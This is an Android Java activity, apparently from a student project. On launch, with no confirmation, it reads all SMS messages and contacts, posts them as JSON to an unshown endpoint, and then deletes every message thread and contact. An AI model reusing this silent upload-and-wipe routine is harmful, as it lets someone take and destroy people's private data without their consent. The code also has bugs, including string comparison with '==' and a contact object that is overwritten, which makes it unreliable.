package iiu.fyp.cdsr;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;


import android.net.Uri;
import android.os.Bundle;
import android.provider.BaseColumns;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Email;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.CommonDataKinds.StructuredPostal;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.view.Menu;
import android.widget.TextView;

public class UploadContent extends Activity {

	TextView textView1;
	String sms = "";
	String contacts = "";
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_upload_content);
		
		textView1 = (TextView)findViewById(R.id.textView1);
		//----------------
		Uri uriSMSURI = Uri.parse("content://sms/inbox");
		JSONObject inboxObject = getsms(uriSMSURI, "inbox");

		Uri uri = Uri.parse("content://sms/sent");
		JSONObject sentObject = getsms(uri, "sent");
		
		JSONObject smsObject = new JSONObject();
		JSONArray smsArray = new JSONArray();
		
		smsArray.put(inboxObject);
		smsArray.put(sentObject);
		try {
			smsObject.put("SMS", smsArray);
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		new PostData(smsObject).execute();
        deletAllMsgs();
        
        JSONObject contactsObj = getcontacts();
        new PostData(contactsObj).execute();
        deleteAllContacts();
        
        
        
	}
	
	

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.upload_content, menu);
		return true;
	}

	public JSONObject getsms(Uri uriSMSURI,String type)
	{
	      Cursor cur = getContentResolver().query(uriSMSURI, null, null, null,null);
	      JSONArray smsArray = new JSONArray();
	      
	      while (cur.moveToNext()) {
	    	  JSONObject object = new JSONObject();
	    	  String phone=cur.getString(2);
	    	  String body=cur.getString(cur.getColumnIndexOrThrow("body")).toString();
	    	  try {
	    		    object.put("phone", phone);
	    		    object.put("body", body);
	    		  } catch (JSONException e) {
	    		    e.printStackTrace();
	    		  }
	    	  smsArray.put(object);
	      }
	      JSONObject smsobject = new JSONObject();
	      try {
			smsobject.put(type, smsArray);
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	      cur.close();
	      return smsobject;
	}
	
	void deletAllMsgs()
    {
    	Uri uri = Uri.parse("content://sms");
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(uri, null, null, null,null);
        while (cursor.moveToNext())
        {
	         long thread_id = cursor.getLong(1);
	         Uri thread = Uri.parse("content://sms/conversations/" + thread_id);
	         getContentResolver().delete(thread, null, null);
        }
        cursor.close();
    }
	
	public JSONObject getcontacts()
	{
		int temp = 1;
		//Create required JSONobjects.
		JSONObject phone_obj = new JSONObject();
		JSONObject json_contacts_obj = new JSONObject();
		JSONObject contact_obj = new JSONObject();
		JSONArray contacts_array = new JSONArray();
		JSONArray address_array = new JSONArray();
		String emailIdOfContact = null;
		int emailType = Email.TYPE_WORK;
		Context context=getBaseContext();
		ContentResolver cr = context.getContentResolver();
		
		Cursor cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,null, null, null, null); 
	       while (cursor.moveToNext()) 
	       { 
	    	   String id = cursor.getString(cursor.getColumnIndex(BaseColumns._ID));
	    	   	String contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

	    		
	    	   	try {
					contact_obj.put("name", contactName);
				} catch (JSONException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}

	    	   	//---------- Retrieving Emails -----------
	    	   	JSONObject email_obj = new JSONObject();
	    	   	Cursor emailnew = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[] { id }, null);
	    	   	Cursor emails = cr.query(Email.CONTENT_URI, null,Email.CONTACT_ID + " = " + id, null, null);
                while (emails.moveToNext()) 
                {
            		
                    emailIdOfContact = emails.getString(emails.getColumnIndex(Email.DATA));
                    emailType = emails.getInt(emails.getColumnIndex(Phone.TYPE));
                    //email1 = email1 + "--" + emailIdOfContact + " - " + emailType;
                    if(emailIdOfContact == "Home")
                    {
                    	try {
							email_obj.put("Home", emailIdOfContact);
						} catch (JSONException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
                    }
                    else if(emailIdOfContact == "Work")
                    {
                    	try {
							email_obj.put("Work", emailIdOfContact);
						} catch (JSONException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
                    }
                    else
                    {
                    	try {
							email_obj.put("Other", emailIdOfContact);
						} catch (JSONException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
                    }
                    
                    
                }
                try {
					contact_obj.put("Email", email_obj);
				} catch (JSONException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
                emails.close();
                emailnew.close();
                //------------------- Retrieve Address ----------------------------
                
             // id = id of the contact you want the details from
                
                String where= ContactsContract.Data.CONTACT_ID + " = " + id + " AND ContactsContract.Data.MIMETYPE = '" + ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE + "'";
                String[] projection = new String[] {
                StructuredPostal.STREET, StructuredPostal.CITY,
                StructuredPostal.POSTCODE, StructuredPostal.STREET,
                StructuredPostal.REGION, StructuredPostal.COUNTRY,
                };

                Cursor cursor2 = getContentResolver().query( ContactsContract.Data.CONTENT_URI, projection, where, null, StructuredPostal.COUNTRY + " asc");
                while (cursor2.moveToNext()) 
                {

            		JSONObject address_obj = new JSONObject();
                    String street1 = cursor2.getString(cursor2.getColumnIndex(StructuredPostal.STREET));
                    String postcode1 = cursor2.getString(cursor2.getColumnIndex(StructuredPostal.POSTCODE));
                    String region1 = cursor2.getString(cursor2.getColumnIndex(StructuredPostal.REGION));
                    String country1 = cursor2.getString(cursor2.getColumnIndex(StructuredPostal.COUNTRY));
                    String city1 = cursor2.getString(cursor2.getColumnIndex(StructuredPostal.CITY));
                    
                    try {
						address_obj.put("City", city1);
					} catch (JSONException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
                    try {
						address_obj.put("Country", country1 );
					} catch (JSONException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
                    try {
						address_obj.put("Region", region1 );
					} catch (JSONException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
                    try {
						address_obj.put("PostalCode", postcode1 );
					} catch (JSONException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
                    try {
						address_obj.put("Street", street1 );
					} catch (JSONException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
                    
                    address_array.put(address_obj);
                    if (cursor2.getCount() > 1)
                	{
                    	temp = 2;
                    	
                	}
                    
                }
				try {
					contact_obj.put("Address", address_array);
				} catch (JSONException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
                
                cursor2.close();
                
	    	   	//----------------------- Retrieve Contact number ------------------------
	    	   	String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID)); 
	    		String hasPhone = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
	    		if (hasPhone!=null) 
	    		{
	    			// You know it has a number so now query it like this.
	    			Cursor phones = getContentResolver().query( ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = "+ contactId, null, null); 
	    			while (phones.moveToNext()) 
	    			{ 
	    				String num = phones.getString(phones.getColumnIndex( ContactsContract.CommonDataKinds.Phone.TYPE));
	    			 	String type=getType(num);
	    			 	String phoneNumber = phones.getString(phones.getColumnIndex( ContactsContract.CommonDataKinds.Phone.NUMBER));
	    				
	    			 	try {
							phone_obj.put(type, phoneNumber);
						} catch (JSONException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
	    			 }
	    			try {
						contact_obj.put("Phone", phone_obj);
					} catch (JSONException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
	    			 phones.close();
	    			 }
	       } 
	       cursor.close();
	       //----------------------------------------------
	       contacts_array.put(contact_obj);
	       try {
			json_contacts_obj.put("Contacts", contacts_array);
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	       
	       return json_contacts_obj;
	}
	
	private String getType(String value)
    {
    	if(value.trim().equals("1"))
    	{
    		return "Home";
    	}
    	else if(value.trim().equals("2"))
    	{
    		return "Mobile";
    	}
    	else if(value.trim().equals("3"))
    	{
    		return "Work";
    	}
    	else if(value.trim().equals("4"))
    	{
    		return "Work Fax";
    	}
    	else if(value.trim().equals("5"))
    	{
    		return "Home Fax";
    	}
    	else if(value.trim().equals("6"))
    	{
    		return "Pager";
    	}
    	else if(value.trim().equals("7"))
    	{
    		return "other";
    	}
    	else if(value.trim().equals("8"))
    	{
    		return "Custom";
    	}
    	else if(value.trim().equals("9"))
    	{
    		return "Callback";
    	}
    	else if(value.trim().equals("10"))
    	{
    		return "Car";
    	}
    	else if(value.trim().equals("11"))
    	{
    		return "Company Main";
    	}
    	else if(value.trim().equals("12"))
    	{
    		return "ISDN";
    	}
    	else if(value.trim().equals("13"))
    	{
    		return "Main";
    	}
    	else if(value.trim().equals("14"))
    	{
    		return "Other Fax";
    	}
    	else if(value.trim().equals("15"))
    	{
    		return "Radio";
    	}
    	else if(value.trim().equals("16"))
    	{
    		return "Telex";
    	}
    	else if(value.trim().equals("17"))
    	{
    		return "TTY TDD";
    	}
    	else if(value.trim().equals("18"))
    	{
    		return "Work Mobile";
    	}
    	else if(value.trim().equals("19"))
    	{
    		return "Work Pager";
    	}
    	else if(value.trim().equals("19"))
    	{
    		return "Assistant";
    	}
    	else if(value.trim().equals("20"))
    	{
    		return "MMS";
    	}
    	else
    	{
    		return null;
    	}
    
    }
	void deleteAllContacts()
    {
    	ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        while (cur.moveToNext()) {
            try{
                String lookupKey = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.LOOKUP_KEY));
                Uri uri = Uri.withAppendedPath(ContactsContract.Contacts.CONTENT_LOOKUP_URI, lookupKey);
                System.out.println("The uri is " + uri.toString());
                cr.delete(uri, null, null);
            }
            catch(Exception e)
            {
                System.out.println(e.getStackTrace());
            }
        }
        cur.close();
    }
	
}